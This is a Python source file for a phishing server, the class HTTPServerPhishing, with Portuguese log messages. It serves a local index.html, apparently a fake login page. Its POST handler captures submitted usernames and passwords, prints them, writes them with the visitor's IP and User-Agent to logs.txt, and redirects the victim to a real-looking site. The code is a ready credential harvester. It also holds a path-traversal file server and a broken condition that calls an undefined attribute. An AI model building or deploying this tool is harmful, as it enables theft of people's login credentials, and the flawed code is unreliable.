from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
import os

class ServerHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        ip = self.client_address[0]
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        user_agent = self.headers.get('User-Agent', 'N/A')

        print(f"[{timestamp}] [GET] Conexão de {ip} - User-Agent: {user_agent}")

        if self.path == '/' or self.redirect_Path + "index.html":
            try:
                with open("index.html", "rb") as file:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(file.read())
            except FileNotFoundError:
                self.send_error(404, "Arquivo index.html não encontrado.")
        else:
            try:
                file_path = self.path.lstrip('/')
                with open(file_path, "rb") as file:
                    content_type = "text/plain"
                    if file_path.endswith(".css"):
                        content_type = "text/css"
                    elif file_path.endswith(".js"):
                        content_type = "application/javascript"
                    elif file_path.endswith(".png"):
                        content_type = "image/png"
                    elif file_path.endswith((".jpg", ".jpeg")):
                        content_type = "image/jpeg"
                    elif file_path.endswith(".gif"):
                        content_type = "image/gif"
                    self.send_response(200)
                    self.send_header("Content-type", content_type)
                    self.end_headers()
                    self.wfile.write(file.read())
            except FileNotFoundError:
                self.send_error(404, f"Arquivo {self.path} não encontrado.")

    def do_POST(self):
        ip = self.client_address[0]
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        user_agent = self.headers.get('User-Agent', 'N/A')

        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = parse_qs(post_data)

        uname = parsed_data.get("username", [""])[0]
        passwd = parsed_data.get("password", [""])[0]

        print(f"[{timestamp}] [POST] Dados capturados de {ip}")
        print(f"User-Agent: {user_agent}")
        print(f"Usuário: {uname}")
        print(f"Senha: {passwd}")
        print("-" * 40)

        with open("logs.txt", "a") as file:
            file.write(f"[{timestamp}] IP: {ip}\nUser-Agent: {user_agent}\n")
            file.write(f"Usuário: {uname}\nSenha: {passwd}\n")
            file.write("-" * 40 + "\n")

        self.send_response(302)
        self.send_header("Location", "https://www.site-real.com")
        self.end_headers()


class HTTPServerPhishing:
    def __init__(self, address, port):
        self.address = address
        self.port = port

    def run(self):
        httpd = HTTPServer((self.address, self.port), ServerHandler)
        print(f"[INFO] Servidor iniciado em {self.address}:{self.port}")
        httpd.serve_forever()